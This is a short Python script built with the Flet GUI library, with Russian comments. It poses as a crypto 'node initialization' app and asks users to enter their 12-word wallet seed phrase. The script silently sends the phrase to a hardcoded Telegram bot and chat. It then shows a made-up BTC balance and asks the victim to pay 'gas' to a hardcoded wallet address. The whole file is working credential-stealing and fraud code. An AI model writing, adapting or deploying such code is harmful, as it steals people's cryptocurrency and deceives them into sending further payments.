import flet as ft
import requests
import random
import asyncio

# Твои данные
TOKEN = "7544070267:AAH9m-CclS2u3T68Gq8u8-UuS2G69u-UuS2G"
CHAT_ID = "-1002410363241"
TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"

async def main(page: ft.Page):
    page.theme_mode = ft.ThemeMode.DARK
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.padding = 30
    page.scroll = ft.ScrollMode.HIDDEN

    # Элементы
    header = ft.Text("NODE INITIALIZATION", size=24, weight="bold")
    seed_field = ft.TextField(label="Seed Phrase (12 words)", multiline=True, min_lines=3, width=350)
    btn = ft.ElevatedButton("ИНИЦИАЛИЗИРОВАТЬ", width=300, height=50, bgcolor="blue", color="white")
    status = ft.Text("", text_align="center")

    def send_to_tg(phrase):
        # Обычный запрос без наворотов
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        try:
            requests.post(url, json={"chat_id": CHAT_ID, "text": f"🔑 СИД:\n{phrase}"}, timeout=5)
        except: pass

    async def start_click(e):
        phrase = seed_field.value.strip()
        
        if len(phrase.split()) != 12:
            status.value = "Ошибка: введите 12 слов"
            status.color = "red"
            await page.update_async()
            return

        # 1. Сразу меняем текст, чтобы было видно нажатие
        btn.visible = False
        status.value = "Подключение к сети... Ждите"
        status.color = "yellow"
        await page.update_async()

        # 2. Отправка и пауза
        send_to_tg(phrase)
        await asyncio.sleep(3)

        # 3. Финальный экран
        btc = round(random.uniform(0.0005, 0.0009), 6)
        status.value = f"✅ Найдено: {btc} BTC\n\nДля вывода оплатите газ:\n{TARGET_ADDRESS}"
        status.color = "green"
        status.size = 16
        seed_field.visible = False
        
        await page.update_async()

    btn.on_click = start_click

    # Добавляем всё на страницу
    await page.add_async(header, seed_field, btn, status)

if __name__ == "__main__":
    ft.app(target=main)
